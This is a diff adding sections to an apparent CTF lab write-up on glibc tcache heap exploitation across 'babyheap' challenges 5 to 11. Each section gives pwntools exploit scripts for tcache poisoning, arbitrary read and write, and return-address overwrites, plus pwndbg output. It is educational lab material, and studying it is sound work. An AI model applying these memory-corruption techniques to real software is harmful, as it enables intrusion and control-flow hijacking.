@@ -272,6 +272,261 @@ After:
 
 ## Challenge 5
 
+This challenge is interesting. After allocating the flag buffer, it sets its chunk `next` pointer to `NULL`. In order to print the flag, a check is being performed on the flag buffer, checking its `next` is NOT a `NULL`. 
+This means we should actually free the flag buffer, which in the case of a non-empty bin, would set its `next` pointer. 
+
+But how can we free the flag buffer without any leak? 
+The idea is simple - first, allocate chunk of the known flag chunk size - `1000`. Then free it, and allocate the flag chunk. This would make the flag address resides within `slot[0]`. Then, when the flag is allocated, allocate another chunk of size `1000` at `slot[1]` and free it, making sure the flag's bin isn't empty. 
+Now, when we would free `slot[0]`, it would set the flag's `next` pointer to `slot[1]` chunk's value.
+
+This is pretty cool. This challenge demonstrates how we can manipulate a chunk, without any UAF vuln. The only vuln used here, is the fact that the slot heap addresses aren't being nullified upon a `free`. 
+
+```python
+size = 1000
+malloc(p, 0, size)
+free(p, 0)
+read_flag(p)  # Now flag address is stored within slot[0]
+
+malloc(p, 1, size)
+free(p, 1)  # The bin corresponding to flag size isn't empty
+
+free(p, 0)  # free the flag chunk, now setting its 'next' ponter to slot[1] value. 
+        
+puts_flag(p)
+```
+
+## Challenge 6
+
+We want to obtain read primitive. \
+My plan is to corrupt a free chunk's `next` pointer. That way, whenever we would allocate twice off that bin, we should have a chunk allocated to the goal address. From there, a simple `puts` of the chunk would give us the secret value.
+
+```python
+def exploit():
+    p = process(BINARY)
+    secret_addr = get_leak_addr(p)
+    print(f'secret_addr: {hex(secret_addr)}')
+
+    buf = struct.pack('<Q', secret_addr)
+    # for size in range(0x10, 0x800, 0x10):
+    size = 0x80
+    print(f'Trying size:{size}')
+    malloc(p, 0, size)
+    malloc(p, 1, size)
+    free(p, 1)
+    free(p, 0)  # Now slot[0] chunk's next is pointing to slot[1]
+    scanf(p, 0, buf)  # Overwrite its next pointer to our secret
+    malloc(p, 2, size)  # Allocate slot[0], now the head of the freelist points to the secret
+    malloc(p, 3, size)  # Now the chunk is allocated on the secret, which address is stored on slot 3!
+    data = puts(p, 3)
+    print(f'got data: {data}')
+    send_flag(p, data)
+        
+    p.interactive()
+```
+
+## Challenge 7
+
+Similar to before, but this time the secret value is 16 bytes long. \
+At a first glance, the solution should be identical. However, notice that upon allocation, the allocator nullifies the `tcache_perthread_struct` member, hence the second qword. \
+We can still bypass this if we would leak 8 bytes at a time, from the end of the secret. 
+
+A simpler approach is to overwrite the whole secret, as it is completely controlled by the allocated chunk.
+
+```python
+def allocate_chunk_at_addr(p, addr):
+    buf = struct.pack('<Q', addr)
+    size = 0x80
+    malloc(p, 0, size)
+    malloc(p, 1, size)
+    free(p, 1)
+    free(p, 0)  # Now slot[0] chunk's next is pointing to slot[1]
+    scanf(p, 0, buf)  # Overwrite its next pointer to our secret
+    malloc(p, 2, size)  # Allocate slot[0], now the head of the freelist points to the secret
+    malloc(p, 3, size)  # Now the chunk is allocated on the secret, which address is stored on slot 3!
+    data = puts(p, 3)
+    print(f'addr[0]: {data}')  # Leaks first 8 bytes
+
+    return data
+
+def exploit():
+    p = process(BINARY)
+    secret_addr = 0x426966
+    print(f'secret_addr: {hex(secret_addr)}')
+
+    allocate_chunk_at_addr(p, secret_addr)
+    my_secret = b'A' * 16
+    scanf(p, 3, my_secret)  # Corrupt secret with known value
+    send_flag(p, my_secret)
+
+    p.interactive()
+```
+
+## Challenge 8
+
+Similar to before, but now the address contains whitespaces within its LSB. Hence, we won't be able to pass it via `scanf`. \
+My idea is to pass another address right before it, which doesn't contains any whitespace characters. 
+
+```python
+def exploit():
+    orig_secret_addr = 0x42ce0a
+    pad = 2
+    secret_addr = orig_secret_addr - pad
+    print(f'secret_addr: {hex(secret_addr)}')
+
+    allocate_chunk_at_addr(p, secret_addr)
+
+    my_secret = b'A' * (pad + 16)
+    scanf(p, 3, my_secret)  # Corrupt secret with known value
+    send_flag(p, my_secret)
+
+    p.interactive()
+```
+
+## Challenge 9
+
+Now we cannot make near allocations (`0x10000` bytes) to the goal secret. \
+Recall we can still create a chunk that contains within its `next` our goal buffer. 
+
+My original idea is to somehow utilize the fact that upon a `malloc` call, the `key` parameter is being nulled out. Moreover, notice the wierd ordering that happens while performing the boundary check: it first does the `malloc`, and if boundary check failed - report the error and nullifies the right slot. Anyways, it DOES performs the allocation!
+This means we can clear the secret this way. 
+
+```python
+def exploit():
+    p = process(BINARY)
+    secret_addr = 0x424b3e
+    pad = 0
+    print(f'secret_addr: {hex(secret_addr)} pad: {hex(pad)}')
+    # Utilize the fact that allocations nullifies the 'key' member, hence clear the whole flag
+    allocate_chunk_at_addr(p, secret_addr - 8)
+    allocate_chunk_at_addr(p, secret_addr)
+    my_secret = b'\x00' * 16
+    send_flag(p, my_secret)
+    p.interactive()
+```
+
+## Challenge 10
+
+Redirect control flow by overwritign main's ra. 
+
+```python
+def exploit():
+    p = process(BINARY)
+    main_ra = get_leak_addr(p) + 280
+    pie_base = get_leak_addr(p) - p.elf.symbols['main']
+    assert(pie_base & 0xfff == 0)
+    win_addr = pie_base + p.elf.symbols['win']
+    print(f'main_ra: {hex(main_ra)} win_addr: {hex(win_addr)}')
+
+    # Utilize the fact that allocations nullifies the 'key' member, hence clear the whole flag
+    allocate_chunk_at_addr(p, main_ra)
+    buf = struct.pack('<Q', win_addr)
+    scanf(p, 3, buf)
+    p.sendline(b'quit')
+```
+
+## Challenge 11
+
+Now the binary is full-mitigated, and there are no leaks. However, we have the option to call `echo` on a pointer and an offset within a slot. Under the hood, it spawns a child process, execs `/usr/bin/echo`, and sends the desired address as `argv[2]`. \
+If we get a `libc` leak, we can simply get a stack leak too, as all it requires is to leak `environ`. From the stack, it should be pretty trivial to leak the program's base. \
+Obtaining a heap leak is trivial using the `next` pointer. My idea is to scan the heap for any other region pointers, such as `libc, stack` or `program`.
+
+For this exact reason, pwndbg contains the awesome tool `p2p` - which searches pointer to pointer chains. Given a mapping, it searches for all pointers that point to a specified mapping. Notice we can state program / libc as simply writing the mapped file:
+
+```bash
+pwndbg> p2p heap /challenge/babyheap_level11.0
+00:0000│  0x563c523c0ce8 (__init_array_start) —▸ 0x563c523bd4e0 (frame_dummy) ◂— endbr64 
+00:0000│  0x563c523c0cf0 (__init_array_start+8) —▸ 0x563c523bd500 (get_heap_location) ◂— endbr64 
+00:0000│  0x563c523c0cf8 (__do_global_dtors_aux_fini_array_entry) —▸ 0x563c523bd4a0 (__do_global_dtors_aux) ◂— endbr64 
+00:0000│  0x563c523c0d78 (_DYNAMIC+120) —▸ 0x563c523bc3a0 ◂— 0x1f00000003
+00:0000│  0x563c523c0d88 (_DYNAMIC+136) —▸ 0x563c523bc700 ◂— 0x6f732e6362696c00
+00:0000│  0x563c523c0d98 (_DYNAMIC+152) —▸ 0x563c523bc3d0 ◂— 0
+00:0000│  0x563c523c0dd8 (_DYNAMIC+216) —▸ 0x563c523c0ef0 (_GLOBAL_OFFSET_TABLE_) ◂— 0x4d00
+00:0000│  0x563c523c0e08 (_DYNAMIC+264) —▸ 0x563c523bca00 ◂— 0x4f08
+00:0000│  0x563c523c0e18 (_DYNAMIC+280) —▸ 0x563c523bc8f8 ◂— 0x4ce8
+00:0000│  0x563c523c0e88 (_DYNAMIC+392) —▸ 0x563c523bc872 ◂— 0x2000200020000
+00:0000│  0x563c523c1008 (__dso_handle) ◂— 0x563c523c1008 (__dso_handle)
+```
+
+However, this feature seems abit buggy - as it actually parsed the program's addresses space, not the heap. \
+Other tools, (that are now actually documented and should work) are `probeleak` and `leakfind`. 
+
+```bash
+pwndbg> probeleak 0x563c523e7000 0x21000
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+0x000c8: 0x0000563c523e7350 = (rw-p) [heap] + 0x350
+0x00358: 0x0000563c523e7010 = (rw-p) [heap] + 0x10
+```
+
+The printings were blue, meaning the found pointers were all heap pointers. 
+
+At this point I think there's something I'm missing within the `echo` handler. Recall its implementation - it uses 6-byte array to store the `"Data:"` string, and right after them, stores the stack canary. By looking at the decomiled code, it seems to be calling `strcpy` to copy the string into the stack. However, by inspecting the assembly, there are only `mov` operations being made. \
+This argument is used as `argv[1]`, where our `ptr + offset` are used as `argv[2]`. Moreover, notice that this handler actually uses a call for `malloc(0x20)` for the `argv` buffer. This actually gives us an arbitrary write primitive:
+
+```c
+argv = (char **)malloc(0x20);
+*argv = "/bin/echo";
+argv[1] = (char *)v4;
+argv[2] = (char *)(ptr + offset);
+```
+
+Because we can fully control `argv` address returned by this malloc, and we control `ptr + offset`, we can basically write to anywhere we want, but we still have no leaks. \
+A trick we can do, is to utilize the fact that `v4`, which is a stack address, is being written to the returned buffer. This means we can leak a stack address, by making sure the `argv` chuck is reused by one of our notes. 
+This is pretty cool - the only vuln here, is the fact that the chunk's pointer within the slot isn't being nullified. Moreover, notice the first qword of the returned chunk is actually loaded with `"/bin/echo"` - which is part of the program's address space, hence yielding a PIE leakage. 
+
+Because our final goal is having both stack and PIE leaks, we can perform the following:
+
+1. `malloc` and `free` a chunk of `0x20`, within `slot[0]`. 
+
+2. Call `echo` for `slot[0]` and `offset = 0`. Its `argv` would be allocated off the right tcache bin. Moreover, it would set the pointer to-be-read as `slot[0]`, which is `argv`. Hence, this would give us PIE program leak - the address of `"/bin/echo"`. 
+
+3. Now we have two approaches. We can use the PIE program leak, in addition to overwriting the `next` ptr of chunks to addresses of our wish, in order to read pointers off the program. Then, we would call the `echo` handler for indices corresponding to the overwritten chunks. It would give us `libc` leakage (from GOT entries, for example). Having `libc` leak, we can repeat the process by reading its `environ` to obtain a stack leak. Notice this approach doesn't use the fact of `v4` overwrite at all, nor `offset`, hence probably not the intended solution (but much cooler). Another option is to use the fact that `echo` actually support printing with an offset. If we would repeat the exact process of 1+2, but provide `offset = 8`, we would obtain `v4` leak. Easy. 
+
+Another thing we have to consider, is the fact that `win` has an `LSB` of `\x00`. In order to bypass the `scanf` call, I've simply jumped to `win + 4`. 
+
+```python
+def echo(p, index, offset):
+    p.sendline(b'echo')
+    p.recvuntil(b'Index: ')
+    p.sendline(str(index).encode())
+    p.recvuntil(b'Offset: ')
+    p.sendline(str(offset).encode())
+    p.recvuntil(b'Data: ')
+    data = p.readline()[:-1] + b'\x00' * 2
+    assert(len(data) == 8)
+    data = struct.unpack('<Q', data)[0]
+    p.recvuntil(b'quit): ')
+
+    return data
+
+def exploit():
+    p = process(BINARY)
+    malloc(p, 0, 0x20)
+    free(p, 0)
+    bin_echo_offset = next(p.elf.search(b"/bin/echo"))
+    pie_base = echo(p, 0, 0) - bin_echo_offset
+    assert(pie_base & 0xfff == 0)
+    win_addr = pie_base + p.elf.symbols['win']
+
+    malloc(p, 0, 0x20)
+    free(p, 0)
+    main_ra = echo(p, 0, 8) + 374
+    print(f'main_ra: {hex(main_ra)} win_addr: {hex(win_addr)}')
+
+    allocate_chunk_at_addr(p, main_ra)
+    buf = struct.pack('<Q', win_addr + 4)  # win_addr has LSB of 0. We have to jump somewhere near. 
+    scanf(p, 3, buf)
+    p.sendline(b'quit')
+
+    p.interactive()
+```
+
+Notice that the exploit isn't 100% reliable. This is ok, as the reason behind this is `main_ra` and `win_addr` having some additional whitespace characters. 
+
+## Challenge 12
+
+This time, our goal is for `malloc` to return a stack pointer.
+
+
 
 
 [heap-techniques]: https://0x434b.dev/overview-of-glibc-heap-exploitation-techniques/
